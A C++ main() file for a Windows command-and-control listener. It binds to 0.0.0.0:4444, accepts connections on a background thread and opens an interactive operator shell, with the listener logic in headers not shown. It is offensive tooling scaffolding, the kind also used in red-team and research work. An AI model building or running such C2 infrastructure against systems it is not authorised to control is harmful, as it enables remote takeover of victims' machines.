#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <thread>
#include "Listener.h"
#include "Console.h"

int main(int argc, char* argv[]) {
    const char* bind_addr = "0.0.0.0";
    uint16_t port = 4444;

    if (argc >= 2) bind_addr = argv[1];
    if (argc >= 3) port = static_cast<uint16_t>(atoi(argv[2]));

    Console::print_banner();

    if (!C2Listener::init_listener(bind_addr, port)) {
        std::cerr << "[-] Failed to start listener on " << bind_addr << ":" << port << std::endl;
        return 1;
    }

    std::cout << "[+] Listener started on " << bind_addr << ":" << port << std::endl;
    std::cout << "[*] Waiting for connections...\n" << std::endl;

    std::thread accept_thread([]() {
        C2Listener::accept_loop();
        });

    Console::interactive_shell();

    C2Listener::g_listener.running = false;
    closesocket(C2Listener::g_listener.listen_socket);
    WSACleanup();

    if (accept_thread.joinable()) {
        accept_thread.join();
    }

    return 0;
}